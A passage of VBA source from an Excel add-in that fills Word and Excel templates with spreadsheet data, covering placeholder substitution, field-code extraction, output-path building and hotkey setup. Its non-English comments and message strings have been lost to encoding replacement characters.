    Dim PrintCopies_FieldName$, n As Name, cell As Range

    ' ==================================
    PrintCopies_FieldName$ = Trim(SETT.GetText("TextBox_PrintCopies_FieldName", ""))
    If Not PrintCopies_FieldName$ Like String(Len(PrintCopies_FieldName$), "#") Then
        If Not PrintCopies_FieldName$ Like "*}" Then PrintCopies_FieldName$ = PrintCopies_FieldName$ & "}"
        If Not PrintCopies_FieldName$ Like "{*" Then PrintCopies_FieldName$ = "{" & PrintCopies_FieldName$
    End If

    If Len(PrintCopies_FieldName$) > 2 Or Val(PrintCopies_FieldName$) > 0 Then
        dict.Add "{%PrintCopiesCount%}", PrintCopies_FieldName$
    End If
    ' ==================================

    Dim i&, key$, baseKey$, newkey$, txt$, txt_part$, LenStep&, arr
    For Each n In WB.Names
        If n.Visible Then
            Set cell = Nothing: Set cell = n.RefersToRange.Cells(1)
            If Not cell Is Nothing Then
                key$ = "{=" & n.Name & "}"
                txt$ = cell.Text
                AddLongTextIntoDictionary txt$, key$, dict
                ' --------------
                key$ = "{=" & cell.Address(0, 0) & "}"
                txt$ = WB.ActiveSheet.Range(cell.Address).Text
                AddLongTextIntoDictionary txt$, key$, dict
            End If
        End If
    Next

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    arr = dict.keys
    For i = LBound(arr) To UBound(arr)
        key$ = arr(i)
        txt$ = "": txt$ = dict(key$)

        If txt$ Like "*{chr#*}*" Then
            txt = Replace(txt, "{chr10}", Chr(10))
            txt = Replace(txt, "{chr11}", Chr(11))
            txt = Replace(txt, "{chr13}", Chr(13))
            txt = Replace(txt, "{chr1310}", vbNewLine)
            dict(key$) = txt$
        End If
    Next i

End Sub

Function ReadMultirowOptions(ByRef ra As Range) As Dictionary
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Set ReadMultirowOptions = New Dictionary
    Dim ro As Range, cell As Range, KeysRange As Range, key$, key2$, txt$, rn&, wbname$, str_txt$
    Dim i&, txt_part$, baseKey$, baseKey2$, newkey$, newkey2$, LenStep&, txt_part1$, txt_part2$

    On Error Resume Next
    Set KeysRange = SpecialCells_TypeConstants(ra.Worksheet.Rows(HEADER_ROW))
    If Not KeysRange Is Nothing Then
        For Each ro In ra.Rows        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            rn = rn + 1
            For Each cell In KeysRange.Cells
                key$ = Trim(cell)
                If Len(key$) > 250 Then key$ = Left(key$, 250)
                If Not key$ Like "*}" Then key$ = key$ & "}"
                If Not key$ Like "{*" Then key$ = "{" & key$

                key2$ = Left(key$, Len(key$) - 1) & "#" & rn & "}"
                txt$ = Intersect(ro.EntireRow, cell.EntireColumn).Text
                If cell.EntireColumn.Hidden Then txt$ = Intersect(ro.EntireRow, cell.EntireColumn).Value

                If rn = 1 Then AddLongTextIntoDictionary txt$, key$, ReadMultirowOptions
                AddLongTextIntoDictionary txt$, key2$, ReadMultirowOptions

                '            If Len(txt$) < 152 Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - 255 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                '                If rn = 1 Then ReadMultirowOptions.Add key$, txt$
                '                ReadMultirowOptions.Add key2$, txt$
                '            Else
                '                LenStep& = 250 - Len(key$) - 12        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|:) |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!
                '                baseKey$ = key$
                '                baseKey2$ = key2$
                '                For i = 1 To Len(txt$) Step LenStep&
                '                    txt_part$ = Mid(txt$, i, LenStep&)
                '                    newkey$ = baseKey$ & "{l=" & i & "}"
                '                    newkey2$ = baseKey2$ & "{l=" & i & "}"
                '
                '                    txt_part1$ = txt_part$: If i + LenStep& - 1 < Len(txt$) Then txt_part1$ = txt_part$ & newkey$
                '                    txt_part2$ = txt_part$: If i + LenStep& - 1 < Len(txt$) Then txt_part2$ = txt_part$ & newkey2$
                '
                '                    If rn = 1 Then ReadMultirowOptions.Add key$, txt_part1$
                '                    ReadMultirowOptions.Add key2$, txt_part2$
                '                    key$ = newkey$
                '                    key2$ = newkey2$
                '                Next i
                '            End If
            Next cell
        Next ro
    End If

    str_txt$ = Replace(Replace(Intersect(ra.EntireRow, ra.Worksheet.Columns(1)).Address, "$A$", ""), ":", "-")

    AddNamedRangesIntoDictionary ReadMultirowOptions, ra.Worksheet.Parent

    ReadMultirowOptions.Add "{%str%}", str_txt$
    ReadMultirowOptions.Add "{%rc%}", rn

    ReadMultirowOptions.Add "{%date%}", Format(Now, "YYYY-MM-DD")
    ReadMultirowOptions.Add "{%shortdate%}", Format(Now, "YYMMDD")

    ReadMultirowOptions.Add "{%longdate%}", Format(Now, "DD MMMM YYYY")
    ReadMultirowOptions.Add "{%time%}", Format(Now, "HH-NN-SS")
    ReadMultirowOptions.Add "{%shorttime%}", Format(Now, "HHNNSS")

    ReadMultirowOptions.Add "{%datetime%}", Format(Now, "YYYY-MM-DD HH-NN-SS")
    ReadMultirowOptions.Add "{%shortdatetime%}", Format(Now, "YYMMDD-HHNNSS")
    ReadMultirowOptions.Add "{%longdatetime%}", Format(Now, "DD MMMM YYYY HH-NN-SS")

    ReadMultirowOptions.Add "{%sheet_name%}", ra.Worksheet.Name
    ReadMultirowOptions.Add "{%sheet_index%}", ra.Worksheet.index
    wbname$ = ra.Worksheet.Parent.Name: If wbname$ Like "*.*" Then wbname$ = Left(wbname$, InStrRev(wbname$, ".") - 1)
    ReadMultirowOptions.Add "{%workbook_name%}", wbname$
    Err.Clear
End Function


Function LoadFieldCodes_ExcelWorkbook(ByRef WB As Workbook, Optional ByRef coll As Collection) As Collection
    On Error Resume Next: Err.Clear
    Dim txt$, sh As Worksheet, cell As Range
    If coll Is Nothing Then Set coll = New Collection

    For Each sh In WB.Worksheets
        With sh.PageSetup
            txt = txt & .LeftFooter & .LeftHeader & .CenterFooter & .CenterHeader & .RightFooter & .RightHeader
        End With
        For Each cell In FindAll(sh.UsedRange, "{*}", xlFormulas, xlPart).Cells
            txt = txt & cell.Formula
        Next cell
        For Each cell In FindAll(sh.UsedRange, "{*}", xlComments, xlPart).Cells
            txt = txt & cell.NoteText
        Next cell
    Next sh

    LoadFieldCodes_fromText txt$, coll
    Set LoadFieldCodes_ExcelWorkbook = coll
End Function

Function LoadFieldCodes_WordDocument(ByRef doc As Object, Optional ByRef coll As Collection) As Collection
    On Error Resume Next: Err.Clear
    Dim myStoryRange As Object, txt$, ShowFieldCodes As Boolean
    If coll Is Nothing Then Set coll = New Collection

    ShowFieldCodes = doc.ActiveWindow.View.ShowFieldCodes
    doc.ActiveWindow.View.ShowFieldCodes = True        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|

    For Each myStoryRange In doc.StoryRanges
        DoEvents
        txt$ = myStoryRange.Text
        LoadFieldCodes_fromText txt$, coll
        While Not (myStoryRange.NextStoryRange Is Nothing)
            Set myStoryRange = myStoryRange.NextStoryRange
            txt$ = myStoryRange.Text
            LoadFieldCodes_fromText txt$, coll
        Wend
    Next myStoryRange

    doc.ActiveWindow.View.ShowFieldCodes = ShowFieldCodes
    Set LoadFieldCodes_WordDocument = coll
End Function

Function LoadFieldCodes_DOC(ByVal TemplateFilename$, ByRef coll As Collection)
    On Error Resume Next: Err.Clear: Dim doc As Object
    Set doc = WA.Documents.Open(TemplateFilename$, , False, False)
    If Not doc Is Nothing Then
        doc.ActiveWindow.View.ShowFieldCodes = True        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        LoadFieldCodes_WordDocument doc, coll
        doc.Close False
    End If
End Function

Function LoadFieldCodes_fromText(ByVal txt$, ByRef coll As Collection)
    On Error Resume Next
    Static REGEXP As Object
    If REGEXP Is Nothing Then Set REGEXP = CreateObject("VBScript.RegExp"): REGEXP.Global = True
    REGEXP.Pattern = "{([^{}]{1,})}"

    Dim Match As Object, code$
    If REGEXP.test(txt) Then
        For Each Match In REGEXP.Execute(txt)
            code$ = Match.submatches.item(0)
            coll.Add code$, LCase$(code$)
        Next
    End If
End Function


Attribute VB_Name = "mod_Functions"
'---------------------------------------------------------------------------------------
' Module        : mod_Functions
' Author        : EducatedFool                     Date: 06.06.2014
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text
Option Private Module

#If VBA7 Then        '  Office 2010-2013
    Declare PtrSafe Function SHCreateDirectoryEx Lib "shell32" Alias "SHCreateDirectoryExA" _
            (ByVal hwnd As LongPtr, ByVal pszPath As String, ByVal psa As Any) As LongPtr
#Else        '  Office 2003-2007
    Declare Function SHCreateDirectoryEx Lib "shell32" Alias "SHCreateDirectoryExA" _
                                         (ByVal hwnd As Long, ByVal pszPath As String, ByVal psa As Any) As Long
#End If

Sub CtrlShiftV()        ' PasteFormulasForSeparateLetters
    On Error Resume Next: Err.Clear
    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
        .GetFromClipboard
        CopyFormulas .GetText
    End With
End Sub

Sub CopyFormulas(ByVal txt$)
    On Error Resume Next: Err.Clear
    Dim ra As Range, n&, nn&, k&, cell As Range, addr$

    Application.ScreenUpdating = False
    Set ra = Selection
    For Each cell In ra.Cells
        n = n + 1
        If n = 1 Then
            addr$ = cell.Address(1, 1, xlA1)
            cell.Value = txt
            cell.Font.Color = vbWhite
            cell.Font.Size = 1
        Else
            If cell.Address = cell.MergeArea.Cells(1).Address Then
                k = k + 1: cell.NumberFormat = "General"
                cell.Formula = "=MID(" & addr & "," & k & ",1)"
            End If
        End If
    Next cell
    If Err = 0 Then Shell "Cmd.exe /c echo " & Chr(7), vbHide
    Application.ScreenUpdating = True
End Sub

Sub Enable_HotKeys()
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    With Application
        If SETT.GetBoolean("CheckBox_PasteFormulasForSeparateLetters") Then .OnKey "^+v", "CtrlShiftV" Else .OnKey "^+v"
        If SETT.GetBoolean("CheckBox_InsertTableLinks") Then .OnKey "^+t", "CtrlShiftT" Else .OnKey "^+t"
        If SETT.GetBoolean("CheckBox_InsertImageLinks") Then .OnKey "^+i", "CtrlShiftI" Else .OnKey "^+i"
    End With
End Sub

Sub Disable_HotKeys()
    On Error Resume Next: Err.Clear
    Application.OnKey "^+v"
End Sub

Function SpecialCells_TypeConstants(ByRef ra As Range) As Range
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ra
    On Error Resume Next: Dim en&: en& = Err.Number
    If ra.Worksheet.ProtectContents Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Dim cell As Range
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        For Each cell In Intersect(ra, ra.Worksheet.UsedRange).Cells
            If Trim(cell.Value) <> "" Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                If SpecialCells_TypeConstants Is Nothing Then
                    Set SpecialCells_TypeConstants = cell
                Else
                    Set SpecialCells_TypeConstants = Union(SpecialCells_TypeConstants, cell)
                End If
            End If
        Next cell

    Else        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel
        Set SpecialCells_TypeConstants = ra.SpecialCells(xlCellTypeConstants)
    End If
    If en& = 0 Then Err.Clear
End Function

Function SpecialCells_VisibleRows(ByRef ra As Range) As Range
    On Error Resume Next: Dim en&: en& = Err.Number
    If ra.Worksheet.ProtectContents Then
        Dim ro As Range
        For Each ro In Intersect(ra, ra.Worksheet.UsedRange.EntireRow).Rows
            If ro.EntireRow.Hidden = False Then
                If SpecialCells_VisibleRows Is Nothing Then
                    Set SpecialCells_VisibleRows = ro
                Else
                    Set SpecialCells_VisibleRows = Union(SpecialCells_VisibleRows, ro)
                End If
            End If
        Next ro
    Else
        Set SpecialCells_VisibleRows = ra.SpecialCells(xlCellTypeVisible)
    End If
    If en& = 0 Then Err.Clear
End Function

Function RenderString(ByVal txt$, ByRef options As Dictionary) As String
    On Error Resume Next: Dim arr, i&: arr = options.keys
    For i = LBound(arr) To UBound(arr)
        txt$ = Replace(txt$, arr(i), options(arr(i)))
    Next i
    RenderString = txt$
End Function

Function CreatePathForFile(ByVal OldFilename$, ByRef options As Dictionary) As String
    On Error Resume Next: Err.Clear
    Dim mask$, ShortOldFilename$, subfolder$, filename$, pcc&, NewFolderPath$, NewFilename$

    mask$ = SETT.GetText("TextBox_OutputMask")        ' f.e., {str} - {filename}.{ext}
    If Len(TMP_OUTPUT_MASK$) Then mask$ = TMP_OUTPUT_MASK$

    ShortOldFilename$ = Replace(OldFilename$, TEMPLATES_FOLDER$, "")

    subfolder$ = Left(ShortOldFilename$, InStrRev(ShortOldFilename$, "\") - 1)
    If Len(subfolder$) Then subfolder$ = subfolder$ & "\"

    filename$ = Dir(OldFilename$)
    filename$ = Left(filename$, InStrRev(filename$, ".") - 1)

    If filename$ Like "*{print=#*}*" Then
        pcc& = Val(Split(filename$, "{print=")(1))
        filename$ = Replace(filename$, "{print=" & pcc& & "}", "")
        options("{%pcc%}") = pcc&
    End If
    If filename$ Like "*{pdf}*" Then
        filename$ = Replace(filename$, "{pdf}", "")
        options("{%pdf%}") = 1
    End If

    options("{%filename%}") = RenderString(filename$, options)
    options("{%ext%}") = GetExtensionForNewFile(ShortOldFilename$)

    NewFilename$ = OUTPUT_FOLDER$ & subfolder$ & Replace_symbols2(RenderString(mask$, options))

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    NewFolderPath$ = Left(NewFilename$, InStrRev(NewFilename$, "\"))
    If Len(Dir(NewFolderPath$, vbDirectory)) = 0 Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        SHCreateDirectoryEx Application.hwnd, NewFolderPath$, ByVal 0&        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    End If

    If Val(Application.Version) > 11 And (PRINT_TO_PDF Or (Val(options("{%pdf%}")) = 1)) Then        ' |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd|
        If TemplateType(OldFilename$) <> "TXT" Then
            NewFilename$ = Left(NewFilename$, InStrRev(NewFilename$, ".") - 1) & ".pdf"
        End If
    End If

    CreatePathForFile = NewFilename$
End Function

Function GetExtensionForNewFile(ByVal filename$)
    On Error Resume Next: Err.Clear
    Select Case Extension(filename$)
        Case "XLT": GetExtensionForNewFile = "XLS"
        Case "XLTM": GetExtensionForNewFile = "XLSM"
        Case "XLTX": GetExtensionForNewFile = "XLSX"
        Case "DOT": GetExtensionForNewFile = "DOC"
        Case "DOTM": GetExtensionForNewFile = "DOCM"
        Case "DOTX": GetExtensionForNewFile = "DOCX"
        Case "DOCXML": GetExtensionForNewFile = "XML"

        Case Else: GetExtensionForNewFile = Extension(filename$)
    End Select
End Function

Function GetFileFormatForNewFile(ByVal filename$) As Long
    On Error Resume Next: Err.Clear
    Select Case Extension(filename$)
        Case "CSV": GetFileFormatForNewFile = xlCSV
        Case "XLS": GetFileFormatForNewFile = xlWorkbookNormal
        Case "XLSM": GetFileFormatForNewFile = 52        ' xlOpenXMLWorkbookMacroEnabled
        Case "XLSX": GetFileFormatForNewFile = 51        ' xlOpenXMLWorkbook
        Case "DOC": GetFileFormatForNewFile = 0        ' wdFormatDocument
        Case "DOCM": GetFileFormatForNewFile = 13        ' wdFormatXMLDocumentMacroEnabled
        Case "DOCX": GetFileFormatForNewFile = 12        ' wdFormatXMLDocument
        Case "XML": GetFileFormatForNewFile = 19        ' wdFormatFlatXML (XML)
            ' Case "XML": GetFileFormatForNewFile = 11        ' wdFormatXML (XML 2003)
    End Select
End Function


Function CollectionOfRowsBlocks(ByRef ra As Range) As Collection
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| ra, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| ComboBox_Multirow_GroupColumn |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|,
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Err.Clear
    Set CollectionOfRowsBlocks = New Collection
    Dim cell As Range, coll As New Collection, txt$, block As Range, col&, msg$, v

    If SETT.GetBoolean("CheckBox_Multirow_GroupRows") Then
        col& = SETT.GetNumber("ComboBox_Multirow_GroupColumn")
        If col& = 0 Then
            msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|MiltiRow|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
                   "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
            MsgBox msg, vbExclamation, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
            ShowSettingsPage
            F_Settings.MultiPage_Options.Value = 4
            F_Settings.ComboBox_Multirow_GroupColumn.SetFocus
            F_Settings.ComboBox_Multirow_GroupColumn.BackColor = vbRed
            Exit Function
        End If

        For Each cell In Intersect(ra.EntireRow, ra.Worksheet.Columns(col&)).Cells
            txt$ = Trim(cell): If Len(txt$) Then coll.Add txt$, txt$
        Next cell

        If coll.Count = 0 Then
            msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|MiltiRow|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: |fffd|" & col& & "|fffd|" & vbNewLine & vbNewLine & _
                   "|fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
            MsgBox msg, vbExclamation, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
            ShowSettingsPage
            F_Settings.MultiPage_Options.Value = 4
            F_Settings.ComboBox_Multirow_GroupColumn.SetFocus
            F_Settings.ComboBox_Multirow_GroupColumn.BackColor = vbRed
            Exit Function
        End If

        For Each v In coll
            Set block = Nothing
            For Each cell In Intersect(ra.EntireRow, ra.Worksheet.Columns(col&)).Cells
                If Trim(cell) = v Then
                    If block Is Nothing Then Set block = cell Else Set block = Union(block, cell)
                End If
            Next cell
            If block Is Nothing Then
                MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Multirow", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                Exit Function
            Else
                CollectionOfRowsBlocks.Add block.EntireRow
            End If
        Next v

    Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        CollectionOfRowsBlocks.Add ra
    End If
End Function


Function CreateAndFill_XLS(ByVal TemplateFilename$, ByVal NewFilename$, _
                           ByRef AllOptions As Dictionary, Optional ByRef pi As ProgressIndicator) As Boolean

    On Error Resume Next: Err.Clear
    Dim WB As Workbook, sh As Worksheet, nam As Name, ra As Range, calc As XlCalculation, i&, txt_Line2$, options As Dictionary
    pi.Line3 = "|fffd||fffd||fffd||fffd|: " & Dir(TemplateFilename$, vbNormal)

    calc = Application.Calculation
    Application.Calculation = xlCalculationManual
    Application.DisplayAlerts = False

    If TemplateType(TemplateFilename$) Like "*template*" Then
        pi.Line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
        Set WB = Application.Workbooks.Add(TemplateFilename$)
    Else
        pi.Line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel ..."
        Set WB = Application.Workbooks.Open(TemplateFilename$, False, True)
    End If

    '  Main_PI.Log "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|? " & Not (WB Is Nothing)

    If SETT.GetBoolean("CheckBox_ReplaceExistingFieldCodesOnly") Then
        Set options = GetTemplateOptions(AllOptions, LoadFieldCodes_ExcelWorkbook(WB))
    Else
        Set options = AllOptions
    End If


    If SETT.GetBoolean("CheckBox_MultiRow") Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Dim rc&: rc = Val(AllOptions("{%rc%}"))
        If rc& = 0 Then Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel: rc& = 0": Exit Function
        pi.Line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (" & rc& & " |fffd||fffd|.) - |fffd||fffd||fffd||fffd||fffd| MULTIROW ..."

        For Each nam In WB.Names
            If nam.Name Like "MultiRow*" Then
                Set ra = Nothing: Set ra = nam.RefersToRange.EntireRow
                'Debug.Print  nam.Name, ra.Address
                If Not ra Is Nothing Then
                    If ra.Rows.Count <= 100 Then
                        For i = 1 To rc&
